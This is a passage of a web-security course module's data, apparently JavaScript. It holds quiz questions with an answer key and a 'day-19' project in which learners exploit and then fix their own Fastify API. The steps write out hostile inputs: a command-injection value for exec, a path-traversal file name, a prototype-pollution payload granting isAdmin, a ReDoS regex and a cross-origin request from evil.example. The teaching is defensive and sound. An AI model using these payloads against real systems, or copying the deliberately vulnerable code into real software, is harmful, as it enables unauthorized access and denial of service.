        "Rewrite history and stop",
        "Add it to `.gitignore`",
      ],
      correctIndex: 1,
      explanation:
        "Cleaning history is tidiness. Treating the secret as disclosed is the response.",
    },
    {
      question: "On a login endpoint, why key the rate limit on both the address and the submitted email?",
      options: [
        "Better logging",
        "Address alone permits credential stuffing across thousands of accounts; email alone lets anyone lock one user out from anywhere",
        "The plugin requires it",
        "To avoid Redis",
      ],
      correctIndex: 1,
      explanation:
        "Together, an attacker needs a new address per account per window, which is the cost you meant to impose.",
    },
    {
      question: "If you remember one thing from this day, what is it?",
      options: [
        "Set every security header",
        "Never confuse \"the user is logged in\" with \"the user may see this particular record\"",
        "Configure CORS strictly",
        "Run `npm audit` in CI",
      ],
      correctIndex: 1,
      explanation:
        "CORS is a browser feature, headers are browser instructions and `npm audit` is a schedule. None of them saves you from a missing `AND user_id = $2`.",
    },
  ],
  project: {
    name: "day-19",
    goal: "Take the API from Day 18 and attack it yourself: exploit an IDOR, break out of the uploads directory, freeze the server with a 30-character body, pollute a prototype into an authorization bypass, then close each hole and prove it with a test.",
    brief:
      "Reading about these is not the same as watching your own server hand you somebody else's invoice. So this build is an attack list, and every item is something you exploit before you fix. Two of them will surprise you even though you have just read the lesson: the path containment check that passes for a sibling directory, and the thirty-character request body that stops your process dead for seven seconds. Do those two with a stopwatch and the numbers written down. Then write the three property tests at the end, because they are the part that keeps the fixes fixed: every route needs credentials, no user reads another's record, and a response has exactly the keys you declared.",
    steps: [
      "Start from your Day 18 `day-18/` project, or create `day-19/` with `\"type\": \"module\"` and install `fastify`, `fastify-plugin`, `@fastify/cookie`, `@fastify/rate-limit`, `@fastify/helmet`, `@fastify/cors`, `@fastify/multipart`, `zod`, `drizzle-orm` and `pg`.",
      "Add an `invoices` table with `user_id`, `total` and `internal_notes`, and seed two users with two invoices each.",
      "Write `GET /invoices/:id` with authentication and no ownership check. Log in as user A, request user B's invoice, and record that you received it.",
      "Add the ownership predicate to the `WHERE` clause and confirm you now get 404. Note why it is 404 and not 403.",
      "Do the same for `DELETE /invoices/:id`, including the affected row count check, and confirm a delete of someone else's invoice returns 404 rather than a cheerful 200.",
      "Write `GET /invoices` filtering in JavaScript after fetching everything, then move the filter into the query and explain what changed besides the response.",
      "Add a nested route `GET /invoices/:invoiceId/lines/:id` that checks only the line against the invoice, exploit it, then fix it with a join up to the owner.",
      "Add `POST /invoices` accepting `userId` in the body, post as another user, then remove the field and take the owner from the session.",
      "Build a permission table and a `requirePermission` hook, then convert your role checks to permission checks.",
      "Restructure your routes into a public `register()` block and an authenticated one, so authentication comes from where a route sits.",
      "Write the route-coverage test: walk `app.printRoutes`, and assert every route outside your public allowlist rejects an anonymous request.",
      "Add `@fastify/rate-limit` with Redis, then confirm the third request at `max: 2` returns 429 with a `retry-after` header.",
      "Run two instances behind any load balancer with an in-memory limiter and confirm you get double the configured limit.",
      "Configure CORS with `origin: true, credentials: true`, then send a request with `Origin: https://evil.example` and record the response headers.",
      "Switch to an allowlist, repeat, and confirm the header is absent for the evil origin.",
      "Send a request with no `Origin` header at all and confirm CORS did nothing, which is the point.",
      "Register Helmet with defaults, serve one HTML page that loads an external font, and watch the browser console.",
      "Configure the CSP directives your page actually needs, and set HSTS `maxAge` to 300 rather than the default year.",
      "Write `GET /files?name=...` using `path.resolve` plus `startsWith(UPLOADS)`, then request `../uploads-evil/secret.txt` after creating that directory. Confirm the check passed.",
      "Fix it with `path.relative` and confirm the rejection, then replace the whole route with an id lookup so there is no path at all.",
      "Add a `POST /diagnostics/ping` route using `exec`, pass `\"localhost; echo INJECTED\"`, and record the output. Switch to `execFile` with `--`, a timeout and a maxBuffer, and repeat.",
      "Add `execFile(..., { shell: true })` once and confirm both the injection and the `DEP0190` warning.",
      "Write a `PATCH /settings` route with a hand-written recursive merge, POST `{\"__proto__\":{\"isAdmin\":true}}`, then check `({}).isAdmin` and confirm an `if (user.isAdmin)` branch now runs for everyone.",
      "Confirm that `JSON.stringify` of a fresh object still looks normal, then fix it with a Zod schema and explain which verified Day 16 behaviour did the work.",
      "Add a `POST /subscribe` route whose email field uses `/^(a+)+$/` for the demonstration, send 30 characters, and record both the elapsed time and whether your `/health` endpoint responded during it.",
      "Fix it by putting `.max(64)` before the pattern, and add a global `bodyLimit`.",
      "Set the global `bodyLimit` to 50MB for an upload route, then move it to the route options and explain the difference.",
      "Add an upload route with all four multipart limits, magic-byte type validation, a generated storage key and a truncation check.",
      "Write the decompression guard with both an absolute cap and a ratio cap, and test it with a small gzip of a very repetitive file.",
      "Run your server with `node --permission --allow-fs-read=./ --allow-fs-write=./tmp` and record every `ERR_ACCESS_DENIED` you hit.",
      "Confirm `--allow-net` does not exist, then confirm a `fetch` still succeeds under `--permission`.",
      "Validate `process.env` with a Zod schema using `parse`, delete a required variable, and compare that failure to a server that boots without it.",
      "Add logger redaction for `authorization`, `cookie` and password fields, then check a request log line for a token.",
      "Add `npm audit --audit-level=high` to a CI workflow alongside `tsc`, `eslint` and `node --test`.",
      "Write the two remaining property tests: a user cannot read another user's invoice, and `GET /invoices/:id` returns exactly the declared key set.",
    ],
    acceptance: [
      "You have a written note of the response you got when reading another user's invoice before the fix, and the 404 after it.",
      "You can say why the ownership check belongs in the `WHERE` clause rather than an `if`, giving all three reasons.",
      "A delete of someone else's invoice returns 404, and you check the affected row count rather than only the absence of an error.",
      "The nested route requires the parent's owner, and you exploited the shallow version first.",
      "`POST /invoices` cannot set the owner from the body, and you can connect that to Day 16's mass assignment.",
      "The route-coverage test exists and fails when you deliberately add an unprotected route.",
      "Rate limiting returns 429 with `retry-after`, and you observed the doubled limit with two instances and an in-memory counter.",
      "You have the recorded response headers for `origin: true` with an evil origin, and can explain why that is worse than the wildcard.",
      "A request with no `Origin` header succeeded against your strict allowlist, and you can state what CORS actually protects.",
      "Helmet's default CSP broke your page, and your configured directives fix it without disabling CSP.",
      "HSTS `maxAge` is short, and you can explain what the default would have done to an HTTP-only subdomain.",
      "You confirmed `startsWith(UPLOADS)` passed for `uploads-evil`, and the `path.relative` version rejects it.",
      "The file route now takes an id and no path, and you can say why that is stronger than any check.",
      "You have the `exec` output showing two commands ran, the `execFile` output showing one argument, and the `DEP0190` warning text.",
      "You polluted `Object.prototype` through your own merge and watched an authorization branch pass for everyone, then closed it with a schema.",
      "You have the elapsed time for the 30-character ReDoS input and a note of whether `/health` answered during it.",
      "`bodyLimit` is per route, not global, and you can explain the heap arithmetic for the global version.",
      "The upload route sets four limits, validates magic bytes, generates its own key and checks truncation.",
      "The decompression guard aborts mid-stream on both an absolute size and a ratio.",
      "You have a list of every `ERR_ACCESS_DENIED` from running under `--permission`, and you confirmed `--allow-net` does not exist while `fetch` still works.",
      "`process.env` is validated with `parse`, and a missing variable kills the process at startup with a readable message.",
      "A request log line contains no bearer token.",
      "CI runs `tsc`, `eslint`, `node --test` and `npm audit --audit-level=high`.",
      "All three property tests pass, and `npx tsc --noEmit` passes.",
    ],
    stretch: [
      "Extract the invoice rules into a policy object and write twenty assertions against it with no HTTP involved, then compare the effort with testing the same rules through `inject`.",
      "Add a `locked` flag that even an admin cannot edit through, and write the test that pins that decision.",
      "Enable PostgreSQL row-level security on `invoices`, set the user id per transaction, then deliberately remove an ownership predicate and confirm the database still refuses.",
      "Add a `CHECK` constraint and a foreign key, then try to violate them with a direct `psql` statement to see what an application-layer check cannot do.",
      "Run CSP in `reportOnly` mode with a report endpoint for a day of local browsing, and see which origins your app actually uses.",
      "Compare a fixed-window and a sliding-window limiter across a window boundary and measure the burst.",
      "Write a load test that reads invoices at exactly your rate limit and calculate how many records an IDOR would leak in a day.",
      "Try `node --disable-proto=throw` on your app and see whether any dependency breaks.",
      "Add `npm ci --ignore-scripts` to CI and find out which of your dependencies stops working.",
      "Write a small `postinstall` script in a local package that prints an environment variable, install it, and see how little friction there was.",
      "Serve uploads from a second Fastify instance on a different port with no cookies, and explain what that changes about content sniffing.",
    ],
  },
};
